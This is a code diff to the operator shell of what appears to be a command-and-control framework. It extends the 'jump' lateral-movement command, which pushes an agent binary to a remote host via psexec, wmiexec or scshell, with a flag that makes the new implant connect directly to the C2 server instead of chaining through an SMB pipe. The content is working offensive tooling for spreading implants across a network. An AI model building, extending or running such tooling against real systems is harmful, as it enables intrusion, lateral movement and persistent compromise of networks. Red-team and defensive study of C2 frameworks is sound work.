@@ -719,12 +719,24 @@ class OperatorShell:
         if cmd == "jump":
             if len(args) < 3:
                 console.print(
-                    "[red]Usage: jump <method> <target> <listener>[/red]\n"
-                    "[dim]  Methods: psexec64 psexec32 wmiexec64 wmiexec32 scshell64 scshell32[/dim]"
+                    "[red]Usage: jump <method> <target> <listener> [--server-connection][/red]\n"
+                    "[dim]  Methods: psexec64 psexec32 wmiexec64 wmiexec32 scshell64 scshell32\n"
+                    "  Default: child chains through parent via SMB pipe\n"
+                    "  --server-connection: child connects directly to C2[/dim]"
                 )
                 return
 
-            method_str, target, listener_name = args[0].lower(), args[1], args[2]
+            # Parse --server-connection flag (can be anywhere after method/target/listener)
+            server_connection = "--server-connection" in args
+            positional = [a for a in args if not a.startswith("--")]
+
+            if len(positional) < 3:
+                console.print(
+                    "[red]Usage: jump <method> <target> <listener> [--server-connection][/red]"
+                )
+                return
+
+            method_str, target, listener_name = positional[0].lower(), positional[1], positional[2]
 
             JUMP_METHODS = {
                 "psexec64": (0, "x64"), "psexec32": (0, "x86"),
@@ -772,26 +784,31 @@ class OperatorShell:
             payload = agent_binary.read_bytes()
             payload_size_kb = len(payload) / 1024
 
-            # Pack wire format: [1B method][4B target_len][target][4B payload_len][payload]
+            # Flags byte: bit 0 = server-connection
+            flags = 0x01 if server_connection else 0x00
+
+            # Pack wire format: [1B method][1B flags][4B target_len][target][4B payload_len][payload]
             import struct
             target_bytes = target.encode("utf-8") + b"\x00"
-            packed = struct.pack("<B", method_id)
+            packed = struct.pack("<BB", method_id, flags)
             packed += struct.pack("<I", len(target_bytes))
             packed += target_bytes
             packed += struct.pack("<I", len(payload))
             packed += payload
 
+            mode_str = "server-connection" if server_connection else "chained"
             self.task_manager.create_task(
                 agent, TaskType.NATIVE, "jump",
                 arguments=packed,
             )
             self.logger.log_command(
                 agent.agent_id, agent.hostname, agent.username,
-                "jump", {"method": method_str, "target": target, "listener": listener_name},
+                "jump", {"method": method_str, "target": target,
+                         "listener": listener_name, "mode": mode_str},
             )
             console.print(
                 f"[green]Task queued: jump {method_str} {target} {listener_name} "
-                f"({payload_size_kb:.1f} KB payload)[/green]"
+                f"({payload_size_kb:.1f} KB, {mode_str})[/green]"
             )
             return
 
